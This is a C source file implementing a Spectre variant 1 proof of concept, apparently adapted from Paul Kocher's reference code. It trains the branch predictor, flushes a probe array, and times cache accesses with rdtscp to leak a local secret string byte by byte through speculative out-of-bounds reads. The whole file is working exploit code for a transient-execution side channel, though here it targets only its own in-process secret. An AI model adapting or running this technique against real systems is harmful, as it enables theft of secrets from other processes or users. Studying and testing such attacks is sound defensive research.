#include <stdio.h>
#include <stdint.h>
#include <malloc.h>
#include <unistd.h>
#include <stdlib.h>

#define CACHE_HIT_THRESHOLD 300

// flush the address from the memory 
#define clflush(_addr) asm volatile("clflush (%0)" : : "r" (_addr));

// measure the time
// access to the mem location
// measure the time again
// find difference between 2 timer
// put the difference in _time variable, or rax
// rdtscp changes rax and rdx, that is why rdx in the
// third column of the assembly code
#define measure_time(_time, _addr) asm volatile(\
				"mfence\n"\
				"lfence\n"\
				"rdtscp\n"\
				"mov %%rax, %%r10\n"\
				"mov (%1), %%rcx\n"\
				"rdtscp;\n"\
				"sub %%r10, %%rax\n"\
				: "=a"(_time)\
				: "b"(_addr)\
				: "rcx", "r10", "rdx");




// flushs the probe array
#define clflush_array(_array)\
	for (int j = 0; j < 256; j++)\
	{\
		clflush(&_array[j * 4096]);\
	}\
	asm volatile("mfence");

// Functions are taken from
// https://www.paulkocher.com/doc/MicrosoftCompilerSpectreMitigation.html
u_int8_t array[256 * 4096];
u_int8_t temp = 0;
int bufferSize = 16;
int bufferSizeMask = 0x0f;
uint8_t buffer[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15};
char secret[] = "The Magic Words are Squeamish Ossifrage.";

// SPECTRE V1

void victim_function(size_t x){
	if(x < bufferSize){
		temp &= array[buffer[x] * 4096];
	}
}


/**
 * Finds cached entry of the array
 * Iterates over 256 entries to find latencies smaller than threshold
 */
void find_cached_index(int* scores){

	uint64_t time_dif;
	int mix_i;
	for(int i = 0; i < 256; i++){

		mix_i = ((i * 167) + 13) & 255;
		time_dif = 0;

		measure_time(time_dif, &array[mix_i * 4096]);

		if(time_dif < CACHE_HIT_THRESHOLD){
			//printf("Timedif:%ld \t mix_i:%d\n", time_dif, mix_i);
			scores[mix_i]++;
		}
	}
}


/**
 * Finds highest score in the scores array
 */
void find_highest_score(int* scores){
	int maxScore = 0;
	int maxIndex = 0;
	for (int i = 1; i < 256; i++){
		if(scores[i] > maxScore){
			maxIndex = i;
			maxScore = scores[i];
		}
	}
	printf("Letter: %c\t Index: %d\t number of hits:%d\n", maxIndex, maxIndex, maxScore);
}

void train_victim(int tries, size_t malicious_x){
	// new training
	size_t training_x, x;
	training_x = tries % bufferSize;

	for (int j = 29; j >= 0; j--) {
		clflush(&bufferSize);
		clflush_array(array);
		//asm volatile("mfence\n");
		//for (volatile int z = 0; z < 100; z++) {}  /* Delay (can also mfence) */

		/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
		/* Avoid jumps in case those tip off the branch predictor */
		x = ((j % 6) - 1) & ~0xFFFF;   /* Set x=FFF.FF0000 if j%6==0, else x=0 */
		x = (x | (x >> 16));           /* Set x=-1 if j&6=0, else x=0 */
		x = training_x ^ (x & (malicious_x ^ training_x));
		
		//victim_function(j % 12);
		/* Call the victim! */
		victim_function(x);
	}
	for (volatile int z = 0; z < 100; z++) {}  /* Delay (can also mfence) */
	//clflush_array(array);
	//clflush(&bufferSize);

	/*
	for (int i = 0; i < 40; i++){
		
		victim_function(0);

		//clflush_array(array);
		clflush(&bufferSize);
	}
	asm volatile("lfence\n");
	clflush_array(array);
	clflush(&bufferSize);
	*/
}

void steal_byte(int* scores, int larger_x){
	// do the experiment 1000 Times
	for(int it = 0; it < 999; it++){
		train_victim(it, larger_x);

		//victim_function(larger_x);
		
		find_cached_index(scores);
	}
	find_highest_score(scores);
}

// Code for Spectre Variant 1
int main(){
	// initialize the array
	for (int i = 0; i < 256 * 4096; i++){
		array[i] = i % 256;
	}
	// steal the secret, secret is 40 byte long
	
	for(int i = 0; i < 40; i++){
		clflush_array(array);

		// initialize scores
		int* scores =(int*) malloc(256 * sizeof(int));
		for (int j = 0; j < 256; j++)
		{
			scores[j] = 0;
		}
		// out of bounds access
		size_t larger_x = (size_t)(secret - (char*)buffer + i);
		//size_t larger_x = 11 + i;

		steal_byte(scores, larger_x);

		free(scores);
	}
	
	return 0;
}
